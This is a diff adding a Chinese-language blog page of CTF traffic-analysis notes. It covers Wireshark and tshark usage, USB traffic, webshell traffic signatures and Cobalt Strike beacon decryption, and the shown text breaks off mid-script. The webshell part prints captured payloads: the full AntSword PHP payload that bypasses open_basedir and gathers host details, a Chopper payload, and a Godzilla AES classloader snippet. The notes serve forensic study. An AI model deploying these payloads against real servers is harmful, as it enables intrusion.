@@ -1,0 +1,1425 @@
+<!DOCTYPE HTML>
+<html lang="zh-CN">
+
+
+<head>
+    <meta charset="utf-8">
+    <meta name="keywords" content="流量分析, marin的小窝">
+    <meta name="description" content="流量分析wireshark 基本使用数据包筛选这是 wireshark 的重要功能，一般的流量都会有很多不同协议，直接看比较容易晕，用这个功能就会比较方便
+
+
+IP 筛选源 ip 筛选
+ip.src &amp;#x3D;&amp;#x3D; 127.0.0">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no">
+    <meta name="renderer" content="webkit|ie-stand|ie-comp">
+    <meta name="mobile-web-app-capable" content="yes">
+    <meta name="format-detection" content="telephone=no">
+    <meta name="apple-mobile-web-app-capable" content="yes">
+    <meta name="apple-mobile-web-app-status-bar-style" content="black-translucent">
+    <meta name="referrer" content="no-referrer-when-downgrade">
+    <!-- Global site tag (gtag.js) - Google Analytics -->
+
+
+    <title>流量分析 | marin的小窝</title>
+    <link rel="icon" type="image/jpeg" href="/favicon.jpg">
+    
+
+
+    <!-- bg-cover style     -->
+
+
+
+<link rel="stylesheet" type="text/css" href="/libs/awesome/css/all.min.css">
+<link rel="stylesheet" type="text/css" href="/libs/materialize/materialize.min.css">
+<link rel="stylesheet" type="text/css" href="/libs/aos/aos.css">
+<link rel="stylesheet" type="text/css" href="/libs/animate/animate.min.css">
+<link rel="stylesheet" type="text/css" href="/libs/lightGallery/css/lightgallery.min.css">
+<link rel="stylesheet" type="text/css" href="/css/matery.css">
+<link rel="stylesheet" type="text/css" href="/css/my.css">
+<link rel="stylesheet" type="text/css" href="/css/dark.css" media="none" onload="if(media!='all')media='all'">
+
+
+
+
+    <link rel="stylesheet" href="/libs/tocbot/tocbot.css">
+    <link rel="stylesheet" href="/css/post.css">
+
+
+
+
+    
+        <link rel="stylesheet" type="text/css" href="/css/reward.css">
+    
+
+
+
+    <script src="/libs/jquery/jquery-3.6.0.min.js"></script>
+
+<meta name="generator" content="Hexo 8.1.1"></head>
+
+
+<body>
+    <header class="navbar-fixed">
+    <nav id="headNav" class="bg-color nav-transparent">
+        <div id="navContainer" class="nav-wrapper container">
+            <div class="brand-logo">
+                <a href="/" class="waves-effect waves-light">
+                    
+                    <img src="/medias/logo.png" class="logo-img" alt="LOGO">
+                    
+                    <span class="logo-span">marin的小窝</span>
+                </a>
+            </div>
+            
+
+<a href="#" data-target="mobile-nav" class="sidenav-trigger button-collapse"><i class="fas fa-bars"></i></a>
+<ul class="right nav-menu">
+  
+  <li class="hide-on-med-and-down nav-item">
+    
+    <a href="/" class="waves-effect waves-light">
+      
+      <i class="fas fa-home" style="zoom: 0.6;"></i>
+      
+      <span>主页</span>
+    </a>
+    
+  </li>
+  
+  <li class="hide-on-med-and-down nav-item">
+    
+    <a href="/tags" class="waves-effect waves-light">
+      
+      <i class="fas fa-tags" style="zoom: 0.6;"></i>
+      
+      <span>标签</span>
+    </a>
+    
+  </li>
+  
+  <li class="hide-on-med-and-down nav-item">
+    
+    <a href="/categories" class="waves-effect waves-light">
+      
+      <i class="fas fa-bookmark" style="zoom: 0.6;"></i>
+      
+      <span>类型</span>
+    </a>
+    
+  </li>
+  
+  <li class="hide-on-med-and-down nav-item">
+    
+    <a href="/archives" class="waves-effect waves-light">
+      
+      <i class="fas fa-archive" style="zoom: 0.6;"></i>
+      
+      <span>归档</span>
+    </a>
+    
+  </li>
+  
+  <li class="hide-on-med-and-down nav-item">
+    
+    <a href="/about" class="waves-effect waves-light">
+      
+      <i class="fas fa-user-circle" style="zoom: 0.6;"></i>
+      
+      <span>关于我</span>
+    </a>
+    
+  </li>
+  
+  <li class="hide-on-med-and-down nav-item">
+    
+    <a href="/friends" class="waves-effect waves-light">
+      
+      <i class="fas fa-address-book" style="zoom: 0.6;"></i>
+      
+      <span>友链</span>
+    </a>
+    
+  </li>
+  
+  <li>
+    <a href="#searchModal" class="modal-trigger waves-effect waves-light">
+      <i id="searchIcon" class="fas fa-search" title="搜索" style="zoom: 0.85;"></i>
+    </a>
+  </li>
+  <li>
+    <a href="javascript:;" class="waves-effect waves-light" onclick="switchNightMode()" title="深色/浅色模式" >
+      <i id="sum-moon-icon" class="fas fa-sun" style="zoom: 0.85;"></i>
+    </a>
+  </li>
+</ul>
+
+
+<div id="mobile-nav" class="side-nav sidenav">
+
+    <div class="mobile-head bg-color">
+        
+        <img src="/medias/logo.png" class="logo-img circle responsive-img">
+        
+        <div class="logo-name">marin的小窝</div>
+        <div class="logo-desc">
+            
+            一个学习网安的小菜鸡
+            
+        </div>
+    </div>
+
+    <ul class="menu-list mobile-menu-list">
+        
+        <li class="m-nav-item">
+	  
+		<a href="/" class="waves-effect waves-light">
+			
+			    <i class="fa-fw fas fa-home"></i>
+			
+			主页
+		</a>
+          
+        </li>
+        
+        <li class="m-nav-item">
+	  
+		<a href="/tags" class="waves-effect waves-light">
+			
+			    <i class="fa-fw fas fa-tags"></i>
+			
+			标签
+		</a>
+          
+        </li>
+        
+        <li class="m-nav-item">
+	  
+		<a href="/categories" class="waves-effect waves-light">
+			
+			    <i class="fa-fw fas fa-bookmark"></i>
+			
+			类型
+		</a>
+          
+        </li>
+        
+        <li class="m-nav-item">
+	  
+		<a href="/archives" class="waves-effect waves-light">
+			
+			    <i class="fa-fw fas fa-archive"></i>
+			
+			归档
+		</a>
+          
+        </li>
+        
+        <li class="m-nav-item">
+	  
+		<a href="/about" class="waves-effect waves-light">
+			
+			    <i class="fa-fw fas fa-user-circle"></i>
+			
+			关于我
+		</a>
+          
+        </li>
+        
+        <li class="m-nav-item">
+	  
+		<a href="/friends" class="waves-effect waves-light">
+			
+			    <i class="fa-fw fas fa-address-book"></i>
+			
+			友链
+		</a>
+          
+        </li>
+        
+        
+    </ul>
+</div>
+
+
+        </div>
+
+        
+    </nav>
+
+</header>
+
+    
+
+
+
+<div class="bg-cover pd-header post-cover" style="background-image: url('https://marin-1347161933.cos.ap-guangzhou.myqcloud.com/img/bdf89e55e2c171c4da83842d5db0c9e0.jpg')">
+    <div class="container" style="right: 0px;left: 0px;">
+        <div class="row">
+            <div class="col s12 m12 l12">
+                <div class="brand">
+                    <h1 class="description center-align post-title">流量分析</h1>
+                </div>
+            </div>
+        </div>
+    </div>
+</div>
+
+
+
+
+<main class="post-container content">
+
+    
+    <div class="row">
+    <div id="main-content" class="col s12 m12 l9">
+        <!-- 文章内容详情 -->
+<div id="artDetail">
+    <div class="card">
+        <div class="card-content article-info">
+            <div class="row tag-cate">
+                <div class="col s7">
+                    
+                    <div class="article-tag">
+                        
+                            <a href="/tags/misc/">
+                                <span class="chip bg-color">misc</span>
+                            </a>
+                        
+                            <a href="/tags/%E6%B5%81%E9%87%8F%E5%88%86%E6%9E%90/">
+                                <span class="chip bg-color">流量分析</span>
+                            </a>
+                        
+                    </div>
+                    
+                </div>
+                <div class="col s5 right-align">
+                    
+                    <div class="post-cate">
+                        <i class="fas fa-bookmark fa-fw icon-category"></i>
+                        
+                            <a href="/categories/MISC/" class="post-category">
+                                MISC
+                            </a>
+                        
+                    </div>
+                    
+                </div>
+            </div>
+
+            <div class="post-info">
+                
+                <div class="post-date info-break-policy">
+                    <i class="far fa-calendar-minus fa-fw"></i>发布日期:&nbsp;&nbsp;
+                    2024-12-12
+                </div>
+                
+
+                
+
+                
+
+                
+
+                
+            </div>
+        </div>
+        <hr class="clearfix">
+
+        
+        <!-- 是否加载使用自带的 prismjs. -->
+        <link rel="stylesheet" href="/libs/prism/prism.css">
+        
+
+        
+
+        <div class="card-content article-card-content">
+            <div id="articleContent">
+                <h1 id="流量分析"><a href="#流量分析" class="headerlink" title="流量分析"></a>流量分析</h1><h3 id="wireshark-基本使用"><a href="#wireshark-基本使用" class="headerlink" title="wireshark 基本使用"></a>wireshark 基本使用</h3><h4 id="数据包筛选"><a href="#数据包筛选" class="headerlink" title="数据包筛选"></a>数据包筛选</h4><p>这是 wireshark 的重要功能，一般的流量都会有很多不同协议，直接看比较容易晕，用这个功能就会比较方便</p>
+<p><img src="https://marin-1347161933.cos.ap-guangzhou.myqcloud.com/img/image-20260201161523-mr09gfd.png" alt="image"></p>
+<ol>
+<li><p>IP 筛选<br>源 ip 筛选</p>
+<pre class="line-numbers language-none" data-start="1"><code class="language-none">ip.src &#x3D;&#x3D; 127.0.0.1</code></pre>
+
+<p>目的 ip 筛选</p>
+<pre class="line-numbers language-none" data-start="1"><code class="language-none">ip.dst &#x3D;&#x3D; 127.0.0.1</code></pre>
+</li>
+<li><p>mac 地址筛选<br>目的 mac 地址筛选</p>
+<pre class="line-numbers language-none" data-start="1"><code class="language-none">eth.dst &#x3D;&#x3D; A0:00:00:04:C5:64</code></pre>
+
+<p>筛选 mac 地址</p>
+<pre class="line-numbers language-none" data-start="1"><code class="language-none">eth.addr &#x3D;&#x3D; A0:00:00:04:C5:64</code></pre>
+</li>
+<li><p>端口筛选<br>筛选 tcp 协议的目标端口为 80 的流量</p>
+<pre class="line-numbers language-none" data-start="1"><code class="language-none">tcp.dstport &#x3D;&#x3D; 80</code></pre>
+
+<p>筛选 tcp 协议的源端口为 80 的流量</p>
+<pre class="line-numbers language-none" data-start="1"><code class="language-none">tcp.srcport &#x3D;&#x3D; 80</code></pre>
+
+<p>筛选 udp 协议的目标端口为 80 的流量</p>
+<pre class="line-numbers language-none" data-start="1"><code class="language-none">upd.srcport &#x3D;&#x3D; 80</code></pre>
+</li>
+<li><p>协议筛选</p>
+<pre class="line-numbers language-none" data-start="1"><code class="language-none">tcp&#x2F;udp&#x2F;icmp&#x2F;ftp</code></pre>
+</li>
+<li><p>流量包长度筛选<br>筛选长度为 20 的 udp 流量</p>
+<pre class="line-numbers language-none" data-start="1"><code class="language-none">udp.length &#x3D;&#x3D; 20</code></pre>
+
+<p>筛选长度大于 20 的 tcp 流量</p>
+<pre class="line-numbers language-none" data-start="1"><code class="language-none">tcp.length &gt;&#x3D; 20</code></pre>
+
+<p>筛选长度为 20 的 ip 流量</p>
+<pre class="line-numbers language-none" data-start="1"><code class="language-none">ip.len &#x3D;&#x3D; 20</code></pre>
+
+<p>筛选全部长度为 20 的流量</p>
+<pre class="line-numbers language-none" data-start="1"><code class="language-none">frame.len &#x3D;&#x3D; 20</code></pre>
+</li>
+<li><p>http 请求筛选<br>筛选请求方法为 GET 的流量</p>
+<pre class="line-numbers language-none" data-start="1"><code class="language-none">http.request.method &#x3D;&#x3D; &quot;GET&quot;</code></pre>
+
+<p>筛选请求方法为 POST 的流量</p>
+<pre class="line-numbers language-none" data-start="1"><code class="language-none">http.request.method &#x3D;&#x3D; &quot;POST&quot;</code></pre>
+
+<p>指定 HTTP 请求的 uri</p>
+<pre class="line-numbers language-none" data-start="1"><code class="language-none">http.request.uri &#x3D;&#x3D; &quot;&#x2F;path?&#x3D;123&quot;</code></pre>
+
+<p>指定请求中包含特定内容</p>
+<pre class="line-numbers language-none" data-start="1"><code class="language-none">http contains &quot;FLAG&quot;</code></pre>
+</li>
+<li><p>手动筛选<br>在查看流量时可能会遇见不会筛选的语句，可以进行手动筛选<br>选中需要的流量或分组详情中的字段，<code>右键 -&gt; 准备作为过滤器 -&gt; 选中/非选中</code>​<br>如果不知道字段名称也可以用这种方法查看<br>​<img src="https://marin-1347161933.cos.ap-guangzhou.myqcloud.com/img/image-20260201161528-3h76i8z.png" alt="image"></p>
+</li>
+</ol>
+<p>‍</p>
+<h4 id="数据包搜索"><a href="#数据包搜索" class="headerlink" title="数据包搜索"></a>数据包搜索</h4><p><img src="https://marin-1347161933.cos.ap-guangzhou.myqcloud.com/img/image-20260201161531-sxk0hyx.png" alt="image"></p>
+<p>在这里进行搜索，可以使用十六进制、字符串、正则表达式、过滤器</p>
+<p><img src="https://marin-1347161933.cos.ap-guangzhou.myqcloud.com/img/image-20260201161533-xn75f2k.png" alt="image"></p>
+<h4 id="数据包还原（追踪流）"><a href="#数据包还原（追踪流）" class="headerlink" title="数据包还原（追踪流）"></a>数据包还原（追踪流）</h4><p>在 wireshark 中，有一个追踪流的功能，可以将多个 HTTP 或 TCP 流量集合到一起，还原成原始数据</p>
+<p>右键需要恢复的流量，选择追踪流和对应的方式，我的 wireshark 升级到最新版只显示接受的显示，旧版应该有多种的，但是不能选的是灰的</p>
+<p><img src="https://marin-1347161933.cos.ap-guangzhou.myqcloud.com/img/image-20260201161535-wqjq06n.png" alt="image"></p>
+<h4 id="数据提取"><a href="#数据提取" class="headerlink" title="数据提取"></a>数据提取</h4><p>wireshark 支持提取通过 http 传输的文件</p>
+<p><code>文件 -&gt; 导出对象 -&gt; HTTP</code></p>
+<p>在列表中选择需要的文件保存</p>
+<p><img src="https://marin-1347161933.cos.ap-guangzhou.myqcloud.com/img/image-20260201161536-axy6u70.png" alt="image"></p>
+<h4 id="流量解密"><a href="#流量解密" class="headerlink" title="流量解密"></a>流量解密</h4><p>在流量分析时，可能会遇到一些被加密的流量，需要解密才能看到流量内容</p>
+<p><code>编辑 -&gt; 首选项 -&gt; protocols -&gt; 要解密的流量</code></p>
+<p>可以在这里上传解密文件或密钥，例如 TLS 流量</p>
+<p><img src="https://marin-1347161933.cos.ap-guangzhou.myqcloud.com/img/image-20260201161551-vn1yzk9.png" alt="image"></p>
+<p><img src="https://marin-1347161933.cos.ap-guangzhou.myqcloud.com/img/image-20260201161553-j8tpo2w.png" alt="image"></p>
+<h3 id="Stratoshark-基本使用"><a href="#Stratoshark-基本使用" class="headerlink" title="Stratoshark 基本使用"></a>Stratoshark 基本使用</h3><p>这个是 wireshark 团队的一个新工具，学长找到的</p>
+<p>挖个坑看看</p>
+<p>这个软件利用的是 <code>sysdig</code> 抓系统进程</p>
+<p>记录一下使用</p>
+<p>有三个抓包功能， 目前只会简单使用最后的 <code>ssh</code> 抓包</p>
+<p><img src="https://marin-1347161933.cos.ap-guangzhou.myqcloud.com/img/image-20260201161554-izx3d7e.png" alt="image"></p>
+<p>主要是配置</p>
+<p>首先是配置 <code>ssh</code> 连接的地址和端口</p>
+<p><img src="https://marin-1347161933.cos.ap-guangzhou.myqcloud.com/img/image-20260201161556-pvzrmmr.png" alt="image"></p>
+<p>然后是配置账户名和密码，这里要使用 root 账户，主要是要使用 <code>sysdig</code> 得用 root 权限</p>
+<p><img src="https://marin-1347161933.cos.ap-guangzhou.myqcloud.com/img/image-20260201161558-cbobilm.png" alt="image"></p>
+<p>后面又配置是用 sudo 的，但是这个没有办法再输入密码，所以一开始就要用 root 进入，有一点是要把 <code>use eBPF</code> 不清楚这个是干什么用的，但是如果点着就会报错</p>
+<p><img src="https://marin-1347161933.cos.ap-guangzhou.myqcloud.com/img/image-20260201161559-u1n18g5.png" alt="image"></p>
+<h3 id="tshark-基本使用"><a href="#tshark-基本使用" class="headerlink" title="tshark 基本使用"></a>tshark 基本使用</h3><p>在使用 wireshark 的时候，会发现有些数据分散在很多包中，一个个提取很麻烦，用 tshark 提取就会轻松很多</p>
+<pre class="line-numbers language-bash" data-language="bash" data-start="1"><code class="language-bash">tshark -r 1.pcap -Y &quot;http contains FLAG&quot; -T fields -e data.data &gt; data.txt
+
+# -r :指定要分析的流量文件
+# -Y :使用的过滤器如果有多个可以用 &amp;&amp; 连接
+# -T fields:输出指定的字段数据
+# -e :输出的字段名称</code></pre>
+
+<p>去除重复的行</p>
+<pre class="line-numbers language-bash" data-language="bash" data-start="1"><code class="language-bash">tshark -r 1.pcap -Y &quot;dns&quot; -T fields -e dns.qry.name | uniq  &gt; data.txt</code></pre>
+
+<p>‍</p>
+<h3 id="流量分析基本考点"><a href="#流量分析基本考点" class="headerlink" title="流量分析基本考点"></a>流量分析基本考点</h3><p>记录一下流量分析的考点，免得老忘 orz</p>
+<h4 id="直接搜索"><a href="#直接搜索" class="headerlink" title="直接搜索"></a>直接搜索</h4><p>最基础的，可以直接通过搜索查找要的信息，例如 flag，pass，key 等等</p>
+<h4 id="文件导出"><a href="#文件导出" class="headerlink" title="文件导出"></a>文件导出</h4><p>通过导出对象获取传输的文件</p>
+<p>‍</p>
+<h4 id="USB-流量"><a href="#USB-流量" class="headerlink" title="USB 流量"></a>USB 流量</h4><p>这个大概分为键盘流量和鼠标流量，其实也可以有其他设备的流量，没见过</p>
+<p>键盘流量一般是 8 字节，鼠标流量是 4 字节</p>
+<h5 id="键盘流量"><a href="#键盘流量" class="headerlink" title="键盘流量"></a>键盘流量</h5><p>基本就是基于这个查找流量对应的按键，不过都要用 tshark 提取出流量，准备学一下写一个脚本对应查看</p>
+<p><a target="_blank" rel="noopener" href="https://www.usb.org/sites/default/files/hut1_21.pdf">HID Usages and Descriptions</a></p>
+<blockquote>
+<p>最近还有一种，就是会在按键的同时加上 alt，在文本中用 alt 加上 4 位数字或字母（好像是），就会得到一个字符，如果加上退格就会得到中文汉字</p>
+</blockquote>
+<h5 id="鼠标流量"><a href="#鼠标流量" class="headerlink" title="鼠标流量"></a>鼠标流量</h5><p>这个见的也少，不过主要是鼠标移动的坐标，然后作图</p>
+<h4 id="webshell-流量分析"><a href="#webshell-流量分析" class="headerlink" title="webshell 流量分析"></a>webshell 流量分析</h4><p>这个是用 shell 工具打的流量，都会有加密，记录一下</p>
+<h5 id="中国菜刀"><a href="#中国菜刀" class="headerlink" title="中国菜刀"></a>中国菜刀</h5><p>流量特征</p>
+<ol>
+<li>在请求包中，user-agent 头一般为火狐，百度等</li>
+<li>请求体中存在 eval，base64 等</li>
+<li>请求体中传递的 payload 为 base64 编码，并且有固定的</li>
+</ol>
+<pre class="line-numbers language-none" data-start="1"><code class="language-none">QGluaV9zZXQoImRpc3BsYXlfZXJyb3JzIiwiMCIpO0BzZXRfdGltZV9saW1pdCgwKTtpZihQSFBfVkVSU0lPTjwnNS4zLjAnKXtAc2V0X21hZ2ljX3F1b3Rlc19ydW50aW1lKDApO307ZWNobygiWEBZIik7J</code></pre>
+
+<p>解码得到的是</p>
+<pre class="line-numbers language-none" data-start="1"><code class="language-none">@ini_set(&quot;display_errors&quot;,&quot;0&quot;);@set_time_limit(0);if(PHP_VERSION&lt;&#39;5.3.0&#39;)&#123;@set_magic_quotes_runtime(0);&#125;;echo(&quot;X@Y&quot;);</code></pre>
+
+<p>解码 base64 应该就能得到 payload</p>
+<h5 id="蚁剑"><a href="#蚁剑" class="headerlink" title="蚁剑"></a>蚁剑</h5><p>通过本地抓包得到的代码</p>
+<p>这是蚁剑使用 default 编码器尝试访问网站时会传送的代码<br>多抓了几个包，发现这个代码的大致框架都是一致的，只是在不同的功能上会修改一些地方</p>
+<blockquote>
+<p>根据 ai 分析了一下代码</p>
+<ol>
+<li>绕过 <code>open_basedir</code>，这个是php的配置项，限制php只能访问特定目录</li>
+</ol>
+<p>这里通过新建一个目录，然后不断向上到根目录，修改 <code>open_basedir</code>为 <code>/</code> 使php可以访问整个文件系统</p>
+<ol start="2">
+<li>输出的加密方式在 <code>asenc</code> 方法中修改<br>而输出的信息会有干扰字符，这是因为 <code>asoutput</code> 函数导致的，只要将这个函数加入的字符串删除就行</li>
+<li>而代码要实现的功能，如文件读取、目录读取<br>则在 <code>try</code> 代码块中修改</li>
+</ol>
+</blockquote>
+<pre class="line-numbers language-php" data-language="php" data-start="1"><code class="language-php">&lt;?php
+@ini_set(&quot;display_errors&quot;, &quot;0&quot;);
+@set_time_limit(0);
+$opdir &#x3D; @ini_get(&quot;open_basedir&quot;);
+if ($opdir) &#123;
+    $ocwd &#x3D; dirname($_SERVER[&quot;SCRIPT_FILENAME&quot;]);
+    $oparr &#x3D; preg_split(base64_decode(&quot;Lzt8Oi8&#x3D;&quot;), $opdir);
+    @array_push($oparr, $ocwd, sys_get_temp_dir());
+    foreach ($oparr as $item) &#123;
+        if (!@is_writable($item)) &#123;
+            continue;
+        &#125;
+        $tmdir &#x3D; $item . &quot;&#x2F;.1cd791f2636d&quot;;
+        @mkdir($tmdir);
+        if (!@file_exists($tmdir)) &#123;
+            continue;
+        &#125;
+        $tmdir &#x3D; realpath($tmdir);
+        @chdir($tmdir);
+        @ini_set(&quot;open_basedir&quot;, &quot;..&quot;);
+        $cntarr &#x3D; @preg_split(&quot;&#x2F;\\\\|\&#x2F;&#x2F;&quot;, $tmdir);
+        for ($i &#x3D; 0; $i &lt; sizeof($cntarr); $i++) &#123;
+            @chdir(&quot;..&quot;);
+        &#125;
+        @ini_set(&quot;open_basedir&quot;, &quot;&#x2F;&quot;);
+        @rmdir($tmdir);
+        break;
+    &#125;
+&#125;
+function asenc($out)
+&#123;
+    return $out;
+&#125;
+function asoutput()
+&#123;
+    $output &#x3D; ob_get_contents();
+    ob_end_clean();
+    echo &quot;063&quot; . &quot;2f6e&quot;;
+    echo @asenc($output);
+    echo &quot;25e&quot; . &quot;6833&quot;;
+&#125;
+ob_start();
+try &#123;
+    $D &#x3D; dirname($_SERVER[&quot;SCRIPT_FILENAME&quot;]);
+    if ($D &#x3D;&#x3D; &quot;&quot;)
+        $D &#x3D; dirname($_SERVER[&quot;PATH_TRANSLATED&quot;]);
+    $R &#x3D; &quot;&#123;$D&#125;	&quot;;
+    if (substr($D, 0, 1) !&#x3D; &quot;&#x2F;&quot;) &#123;
+        foreach (range(&quot;C&quot;, &quot;Z&quot;) as $L)
+            if (is_dir(&quot;&#123;$L&#125;:&quot;))
+                $R .&#x3D; &quot;&#123;$L&#125;:&quot;;
+    &#125; else &#123;
+        $R .&#x3D; &quot;&#x2F;&quot;;
+    &#125;
+    $R .&#x3D; &quot;	&quot;;
+    $u &#x3D; (function_exists(&quot;posix_getegid&quot;)) ? @posix_getpwuid(@posix_geteuid()) : &quot;&quot;;
+    $s &#x3D; ($u) ? $u[&quot;name&quot;] : @get_current_user();
+    $R .&#x3D; php_uname();
+    $R .&#x3D; &quot;	&#123;$s&#125;&quot;;
+    echo $R;
+&#125; catch (Exception $e) &#123;
+    echo &quot;ERROR:&#x2F;&#x2F;&quot; . $e-&gt;getMessage();
+&#125;
+
+asoutput();
+die();
+?&gt;</code></pre>
+
+<p>其他方式特征：</p>
+<ol>
+<li><p>base64<img src="https://marin-1347161933.cos.ap-guangzhou.myqcloud.com/img/image-20260201161611-5ymftbc.png" alt="image"></p>
+</li>
+<li><p>chr</p>
+<p><img src="https://marin-1347161933.cos.ap-guangzhou.myqcloud.com/img/image-20260201161615-9q6ktxv.png" alt="image"></p>
+</li>
+<li><p>chr16<br>​<img src="https://marin-1347161933.cos.ap-guangzhou.myqcloud.com/img/image-20260201161619-3dq549w.png" alt="image"></p>
+</li>
+<li><p>rot13<br>​<img src="https://marin-1347161933.cos.ap-guangzhou.myqcloud.com/img/image-20260201161621-8t7dy78.png" alt="image"></p>
+</li>
+</ol>
+<p>返回包数据取决于蚁剑设置的解码器，有三种</p>
+<ol>
+<li>default</li>
+<li>base64</li>
+<li>rot13</li>
+</ol>
+<p>蚁剑最显眼的特征就是最开头的两句话</p>
+<pre class="line-numbers language-php" data-language="php" data-start="1"><code class="language-php">@ini_set(&quot;display_errors&quot;, &quot;0&quot;);
+@set_time_limit(0);</code></pre>
+
+<p>主要是用来消除错误信息和取消执行时间限制</p>
+<h5 id="冰蝎"><a href="#冰蝎" class="headerlink" title="冰蝎"></a>冰蝎</h5><hr>
+<p>冰蝎的加密逻辑比较固定，一般都是先 <code>AES-CBC</code> 然后 base64，解密只要反过来就行，主要要找AES的key，AES的iv一般是用全0填充，不过也有可能会被魔改，具体要看流量有没有进行额外操作</p>
+<p>冰蝎加密的密钥用的是密码的md5值的前16位</p>
+<p>冰蝎可以自己写加密方式<br>冰蝎自带的加密方式都可以通常冰蝎直接查看</p>
+<p><img src="https://marin-1347161933.cos.ap-guangzhou.myqcloud.com/img/image-20260201161626-bstth8s.png" alt="image"></p>
+<p>加解密都有</p>
+<h5 id="哥斯拉"><a href="#哥斯拉" class="headerlink" title="哥斯拉"></a>哥斯拉</h5><p>这个我没怎么做过 orz，都是参考网上文章记录的</p>
+<p>哥斯拉的特征就是返回包的数据的前后十六位都是固定的哈希值，是用 xor 加密的</p>
+<p>所以解密就找到 xor 的 key，不过这个 key 要看下 php 中有没有什么操作，有可能会把第一位移到最后去</p>
+<p>哥斯拉流量有时候会使用 gzip 进行压缩，要解密的话可以使用 gunzip 进行解密</p>
+<p><img src="https://marin-1347161933.cos.ap-guangzhou.myqcloud.com/img/image-20260201161628-zsj6dnc.png" alt="image"></p>
+<pre class="line-numbers language-java" data-language="java" data-start="1"><code class="language-java">String code&#x3D;&quot;ZiFsXmEqZ3tBN2I0X1g5ektfMnY4Tl93TDVxNH0&#x3D;&quot;; 
+String xc&#x3D;&quot;a2550eeab0724a69&quot;; 
+class X extends ClassLoader&#123;
+    public X(ClassLoader z)&#123;
+        super(z);
+    &#125;                        
+	public Class Q(byte[] cb)&#123;
+    	return super.defineClass(cb, 0, cb.length);
+	&#125; 
+	&#125;
+public byte[] x(byte[] s,boolean m)&#123; 
+    try&#123;
+        javax.crypto.Cipher c&#x3D;javax.crypto.Cipher.getInstance(&quot;AES&quot;);
+        c.init(m?1:2,new javax.crypto.spec.SecretKeySpec(xc.getBytes(),&quot;AES&quot;));
+        return c.doFinal(s); 
+    &#125;
+    catch (Exception e)&#123;
+        return null; 
+    &#125;
+&#125;</code></pre>
+
+<h4 id="CobalStrike-流量"><a href="#CobalStrike-流量" class="headerlink" title="CobalStrike 流量"></a>CobalStrike 流量</h4><p><code>CobalStrike</code> 团队协作的内网渗透工具</p>
+<h5 id="工作流程"><a href="#工作流程" class="headerlink" title="工作流程"></a>工作流程</h5><ol>
+<li>被控机向 <code>TeamServer</code> 发送心跳包，包中包含了主机信息和协商密钥等信息，这些信息被使用 RSA 公钥进行加密后放到了 cookie 中</li>
+<li><code>server</code> 端第一次心跳后进入睡眠，并利用私钥将数据包解开后获得主机信息和协商密钥，基于协商密钥会生成新的 AES key 和 HMAC key</li>
+<li>睡眠时间过后，会再一次发送心跳包询问是否有新的命令，当有新的命令出现时会将其数据包加密后发送，而命令会作为该回应包的 body 发送</li>
+<li>被控端在接收到数据之后进行解密获取命令，再将命令执行的节后加密后返回给 <code>TeamServer</code> 该次传输使用 POST 请求发送</li>
+<li><code>TeamServer</code>解密后看到回显</li>
+<li>当 3 中睡眠时间过了之后，再次发送心跳包却没有接收到新的指令信息，这时候就会返回空包</li>
+</ol>
+<p><img src="https://marin-1347161933.cos.ap-guangzhou.myqcloud.com/img/image-20250805115123-l985dp8.png" alt="image"></p>
+<ul>
+<li><code>Private Key</code>​ 和 <code>Public Key</code>​ 是特定的，并且保存在 <code>.cobaltstrike.beacon_keys</code> 文件中，对于一个固定的 CS ，经过首次使用 CS 软件，就会生成一组固定的私钥和公钥，现在很多 CS 的 私钥都披露了，如果能抓到攻击者的 CS 流量，能够精确的找到对应的私钥，就能解密流量包</li>
+</ul>
+<h5 id="信标"><a href="#信标" class="headerlink" title="信标"></a>信标</h5><p>信标就是 cs 中的 <code>beacon</code>​，是 cs 的后渗透工具，会在目标机植入一个 <code>beacon.exe</code>​ 以低频次、慢速的方式与 cs 服务器通信，同时因为信标由 <code>teamserver</code>​ 端生成，其中包含 <code>teamserver</code> 端的很多信息，更是可以通过静态和动态的信标解密 cs 的通信流量</p>
+<h5 id="心跳包"><a href="#心跳包" class="headerlink" title="心跳包"></a>心跳包</h5><p>心跳包就是 <code>beacon</code> 向 cs 服务器发送的通信数据包，是定时发送心跳包询问，有命令加密后进行回包，无命令就返回空包，有效避免了长时间不间断的数据传输和通信而被防御设备检测到异常流量</p>
+<h5 id="解密流量"><a href="#解密流量" class="headerlink" title="解密流量"></a>解密流量</h5><p>cs 流量比较特征的就是会请求一个 <code>/****</code>​ 的 url，这4个字符是有特征的，如果四个字符 ascii 相加并 mod 256 得到的结果是 93 ，就是 <code>x64</code>​ 的，92 就是 <code>x32</code> 的</p>
+<pre class="line-numbers language-python" data-language="python" data-start="1"><code class="language-python">url &#x3D; &quot;TJvI&quot;
+
+ascii &#x3D; sum([ord(i) for i in url])
+fin &#x3D; ascii % 256
+print(fin)</code></pre>
+
+<p><img src="https://marin-1347161933.cos.ap-guangzhou.myqcloud.com/img/image-20260201161638-edk7pvj.png" alt="image"></p>
+<p>这个就是获取 <code>beacon</code>​ 的流量，把这个导出来是可以利用脚本分析的 <a target="_blank" rel="noopener" href="https://github.com/minhangxiaohui/CSthing">minhangxiaohui&#x2F;CSthing: somthing about Cobaltstrike</a></p>
+<pre class="line-numbers language-cmd" data-language="cmd" data-start="1"><code class="language-cmd">python 1768.py TJvI</code></pre>
+
+<p><img src="https://marin-1347161933.cos.ap-guangzhou.myqcloud.com/img/image-20260201161640-xf8l038.png" alt="image"></p>
+<p>这里就能获取到公钥了，后面的那个就是响应的 url</p>
+<p>这里是空包的心跳包，这里的 cookie 存放了加密过的受害端信息</p>
+<p><img src="https://marin-1347161933.cos.ap-guangzhou.myqcloud.com/img/image-20260201161644-bkj02g5.png" alt="image"></p>
+<p>下面这个就是有数据的心跳包</p>
+<p><img src="https://marin-1347161933.cos.ap-guangzhou.myqcloud.com/img/image-20260201161647-f5stsbj.png" alt="image"></p>
+<p>要对 cookie 进行解析，就要获取私钥，私钥一般存放在 <code>.cobaltstrike.beacon_keys</code> ，没有这个文件就需要自己解密获取</p>
+<p>这里有几个方法可以用</p>
+<ol>
+<li><p>手解 rsa</p>
+<p>这个全是参考大佬的，因为我完全不会密码（</p>
+<p><a target="_blank" rel="noopener" href="http://ta0.fun/posts/a70a62d9/">CobaltStrike4.0流量分析 | ta0的小站</a></p>
+<p>先用脚本获取 n 和 e</p>
+<pre class="line-numbers language-python" data-language="python" data-start="1"><code class="language-python">from Cryptodome.PublicKey import RSA
+import base64
+
